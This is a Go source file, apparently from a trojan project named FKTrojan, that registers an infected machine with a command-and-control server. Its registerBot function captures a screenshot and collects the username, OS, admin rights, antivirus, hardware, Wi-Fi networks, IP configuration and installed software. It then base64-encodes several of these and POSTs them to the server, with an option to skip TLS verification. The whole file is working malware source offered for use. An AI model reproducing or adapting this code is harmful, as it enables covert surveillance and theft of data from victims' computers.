/*
Author: FreeKnight
命令：  	spin
作用：	注册本客户端
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
)

//------------------------------------------------------------
// 注册本客户端
func registerBot() {
	if useSSL {
		// 先截个屏瞅瞅
		bty, _ := captureScreen(true)

		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
		}
		client := &http.Client{Transport: tr}

		data := url.Values{}
		data.Set("0", myUID)
		data.Add("1", myIP)
		data.Add("2", getWhoami())
		data.Add("3", getOS())
		data.Add("4", getInstallDate())
		data.Add("5", checkIsAdmin())
		data.Add("6", getAntiVirus())
		data.Add("7", getCPU())
		data.Add("8", getGPU())
		data.Add("9", clientVersion)
		data.Add("10", common.Base64Encode(getSysInfo()))
		data.Add("11", common.Base64Encode(getWifiList()))
		data.Add("12", common.Base64Encode(getIPConfig()))
		data.Add("13", common.Base64Encode(getInstalledSoftware()))
		data.Add("14", common.Base64Encode(string(bty)))

		// 填充完数据，发送给服务器
		u, _ := url.ParseRequestURI(serverAddress + "new")
		urlStr := fmt.Sprintf("%v", u)
		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
		r.Header.Set("User-Agent", userAgentKey)
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(r)
		if err != nil {
		} else {
			if resp.StatusCode == 200 {
			}
		}
	} else {

		bty, _ := captureScreen(true)

		client := &http.Client{}

		data := url.Values{}
		data.Set("0", myUID)
		data.Add("1", myIP)
		data.Add("2", getWhoami())
		data.Add("3", getOS())
		data.Add("4", getInstallDate())
		data.Add("5", checkIsAdmin())
		data.Add("6", getAntiVirus())
		data.Add("7", getCPU())
		data.Add("8", getGPU())
		data.Add("9", clientVersion)
		data.Add("10", common.Base64Encode(getSysInfo()))
		data.Add("11", common.Base64Encode(getWifiList()))
		data.Add("12", common.Base64Encode(getIPConfig()))
		data.Add("13", common.Base64Encode(getInstalledSoftware()))
		data.Add("14", common.Base64Encode(string(bty)))

		u, _ := url.ParseRequestURI(serverAddress + "new")
		urlStr := fmt.Sprintf("%v", u)
		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
		r.Header.Set("User-Agent", userAgentKey)
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(r)
		if err != nil {
		} else {
			if resp.StatusCode == 200 {
			}
		}
	}
}

//------------------------------------------------------------
